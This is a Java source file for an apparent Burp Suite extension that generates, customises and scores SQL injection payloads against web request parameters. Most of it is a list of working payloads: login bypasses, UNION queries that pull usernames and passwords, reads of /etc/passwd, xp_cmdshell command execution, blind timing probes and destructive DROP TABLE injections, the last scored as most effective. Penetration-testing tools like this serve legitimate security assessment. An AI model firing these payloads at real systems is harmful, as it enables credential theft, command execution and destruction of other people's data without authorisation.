package com.secure.ai.burp.payloads.generators;

import burp.api.montoya.http.HttpRequestToBeSent;
import com.secure.ai.burp.ml.ModelManager;
import com.secure.ai.burp.ml.MLPrediction;
import com.secure.ai.burp.payloads.GeneratedPayload;
import com.secure.ai.burp.payloads.PayloadContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;

public class SQLiPayloadGenerator implements PayloadGeneratorStrategy {
    private static final Logger logger = LoggerFactory.getLogger(SQLiPayloadGenerator.class);
    
    private final ModelManager modelManager;
    private final AtomicInteger generatedCount = new AtomicInteger(0);
    
    // Basic SQL injection payloads
    private static final String[] BASIC_PAYLOADS = {
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' UNION SELECT null--",
        "\" UNION SELECT null--",
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "' AND SLEEP(5)--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
    };
    
    // Advanced SQL injection payloads
    private static final String[] UNION_PAYLOADS = {
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1, version(), database(), user()--",
        "' UNION SELECT null, null, null, table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT load_file('/etc/passwd')--",
        "' UNION SELECT @@version, @@datadir, @@hostname--",
        "\" UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--"
    };
    
    // Time-based blind SQL injection
    private static final String[] TIME_BASED_PAYLOADS = {
        "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT pg_sleep(5)--",
        "' AND IF(1=1, SLEEP(5), 0)--",
        "' OR IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
    };
    
    // Boolean-based blind SQL injection
    private static final String[] BOOLEAN_PAYLOADS = {
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT LENGTH(database()))>5--",
        "' AND ASCII(SUBSTRING(database(),1,1))>64--",
        "' AND (SELECT user())='root'--",
        "' AND EXISTS(SELECT * FROM users WHERE username='admin')--"
    };
    
    // Database-specific payloads
    private static final Map<String, String[]> DATABASE_SPECIFIC = new HashMap<String, String[]>() {{
        put("mysql", new String[]{
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
            "' UNION SELECT 1, load_file('/etc/passwd'), 3--"
        });
        
        put("postgresql", new String[]{
            "'; SELECT version()--",
            "'; SELECT current_database()--",
            "' UNION SELECT null, version(), null--"
        });
        
        put("mssql", new String[]{
            "'; EXEC xp_cmdshell('dir')--",
            "' UNION SELECT null, @@version, null--",
            "'; WAITFOR DELAY '00:00:05'--"
        });
        
        put("oracle", new String[]{
            "' UNION SELECT null, banner FROM v$version--",
            "' UNION SELECT null, user FROM dual--",
            "' AND (SELECT COUNT(*) FROM user_tables)>0--"
        });
    }};
    
    public SQLiPayloadGenerator(ModelManager modelManager) {
        this.modelManager = modelManager;
    }
    
    @Override
    public List<GeneratedPayload> generatePayloads(HttpRequestToBeSent request, PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        try {
            // Generate different types of SQL injection payloads
            payloads.addAll(generateBasicPayloads(context));
            payloads.addAll(generateUnionPayloads(context));
            payloads.addAll(generateTimeBasedPayloads(context));
            payloads.addAll(generateBooleanPayloads(context));
            payloads.addAll(generateDatabaseSpecificPayloads(context));
            payloads.addAll(generateParameterSpecificPayloads(context));
            
            // Remove duplicates and score payloads
            payloads = removeDuplicates(payloads);
            scorePayloads(payloads, context);
            
            generatedCount.addAndGet(payloads.size());
            
        } catch (Exception e) {
            logger.error("Error generating SQL injection payloads", e);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateBasicPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String payload : BASIC_PAYLOADS) {
            GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "sqli", context)
                    .generationMethod("basic")
                    .effectivenessScore(0.6)
                    .build();
            
            payloads.add(generatedPayload);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateUnionPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        if (context.hasDatabaseInteraction()) {
            for (String payload : UNION_PAYLOADS) {
                GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "sqli", context)
                        .generationMethod("union")
                        .effectivenessScore(0.7)
                        .build();
                
                payloads.add(generatedPayload);
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateTimeBasedPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String payload : TIME_BASED_PAYLOADS) {
            GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "sqli", context)
                    .generationMethod("time_based")
                    .effectivenessScore(0.8)
                    .addMetadata("requires_time_analysis", true)
                    .build();
            
            payloads.add(generatedPayload);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateBooleanPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String payload : BOOLEAN_PAYLOADS) {
            GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "sqli", context)
                    .generationMethod("boolean_blind")
                    .effectivenessScore(0.75)
                    .addMetadata("requires_differential_analysis", true)
                    .build();
            
            payloads.add(generatedPayload);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateDatabaseSpecificPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String database : context.getApplicationContext().getDatabases()) {
            String[] dbPayloads = DATABASE_SPECIFIC.get(database.toLowerCase());
            if (dbPayloads != null) {
                for (String payload : dbPayloads) {
                    GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "sqli", context)
                            .generationMethod("database_specific_" + database)
                            .effectivenessScore(0.85)
                            .addMetadata("target_database", database)
                            .build();
                    
                    payloads.add(generatedPayload);
                }
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateParameterSpecificPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        // Generate payloads for numeric parameters (higher chance of SQLi)
        for (String param : context.getNumericParameters()) {
            payloads.add(new GeneratedPayload.Builder(
                "1 OR 1=1", "sqli", context)
                .generationMethod("numeric_parameter")
                .targetParameter(param)
                .effectivenessScore(0.8)
                .build());
            
            payloads.add(new GeneratedPayload.Builder(
                "1; DROP TABLE " + param + "_table--", "sqli", context)
                .generationMethod("destructive_numeric")
                .targetParameter(param)
                .effectivenessScore(0.9)
                .build());
        }
        
        // Generate payloads for search parameters
        if (context.hasSearchParameters()) {
            payloads.add(new GeneratedPayload.Builder(
                "admin'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--", "sqli", context)
                .generationMethod("search_optimized")
                .effectivenessScore(0.8)
                .build());
        }
        
        return payloads;
    }
    
    private void scorePayloads(List<GeneratedPayload> payloads, PayloadContext context) {
        for (GeneratedPayload payload : payloads) {
            double contextScore = calculateContextualScore(payload, context);
            payload.setContextRelevanceScore(contextScore);
            
            // Use ML model to score if available
            if (modelManager.isModelLoaded("sqli_detection")) {
                try {
                    MLPrediction prediction = modelManager.predictText("sqli_detection", payload.getPayload());
                    if (prediction != null) {
                        payload.setEffectivenessScore(prediction.getMaxPrediction());
                    }
                } catch (Exception e) {
                    logger.debug("ML scoring failed for SQL payload, using fallback", e);
                }
            }
        }
    }
    
    private double calculateContextualScore(GeneratedPayload payload, PayloadContext context) {
        double score = 0.0;
        
        // Higher score for database interaction context
        if (context.hasDatabaseInteraction()) {
            score += 0.3;
        }
        
        // Higher score for search parameters
        if (context.hasSearchParameters()) {
            score += 0.2;
        }
        
        // Higher score for numeric parameters
        if (payload.getTargetParameter() != null && 
            context.getNumericParameters().contains(payload.getTargetParameter())) {
            score += 0.3;
        }
        
        // Database-specific scoring
        String method = payload.getGenerationMethod();
        if (method.startsWith("database_specific_")) {
            String database = (String) payload.getMetadata("target_database");
            if (context.getApplicationContext().hasDatabase(database)) {
                score += 0.4;
            }
        }
        
        // Higher score if no SQL injection protection
        if (!context.getApplicationContext().hasSQLiProtection()) {
            score += 0.2;
        }
        
        return Math.min(score, 1.0);
    }
    
    private List<GeneratedPayload> removeDuplicates(List<GeneratedPayload> payloads) {
        Set<String> seen = new HashSet<>();
        List<GeneratedPayload> unique = new ArrayList<>();
        
        for (GeneratedPayload payload : payloads) {
            String key = payload.getPayload() + "_" + payload.getGenerationMethod();
            if (seen.add(key)) {
                unique.add(payload);
            }
        }
        
        return unique;
    }
    
    @Override
    public GeneratedPayload customizePayload(String basePayload, PayloadContext context) {
        String customized = basePayload;
        
        // Customize based on detected database
        Set<String> databases = context.getApplicationContext().getDatabases();
        if (!databases.isEmpty()) {
            String database = databases.iterator().next();
            switch (database.toLowerCase()) {
                case "mysql":
                    customized = basePayload.replace("--", "# ");
                    break;
                case "postgresql":
                    customized = basePayload.replace("@@version", "version()");
                    break;
            }
        }
        
        return new GeneratedPayload.Builder(customized, "sqli", context)
                .generationMethod("customized")
                .effectivenessScore(0.75)
                .build();
    }
    
    @Override
    public String getVulnerabilityType() {
        return "sqli";
    }
    
    @Override
    public int getGeneratedCount() {
        return generatedCount.get();
    }
    
    @Override
    public void updateLearning(GeneratedPayload payload, boolean wasSuccessful, double actualEffectiveness) {
        logger.debug("Updating SQLi generator learning: method={}, successful={}, effectiveness={}", 
                    payload.getGenerationMethod(), wasSuccessful, actualEffectiveness);
    }
    
    @Override
    public double getContextualPriority(PayloadContext context) {
        double priority = 0.4; // Base priority
        
        if (context.hasDatabaseInteraction()) priority += 0.3;
        if (context.hasSearchParameters()) priority += 0.2;
        if (!context.getNumericParameters().isEmpty()) priority += 0.2;
        if (!context.getApplicationContext().hasSQLiProtection()) priority += 0.1;
        
        return Math.min(priority, 1.0);
    }
    
    @Override
    public boolean isApplicable(PayloadContext context) {
        return context.hasDatabaseInteraction() || 
               context.hasSearchParameters() || 
               !context.getNumericParameters().isEmpty() ||
               context.hasIdParameters();
    }
}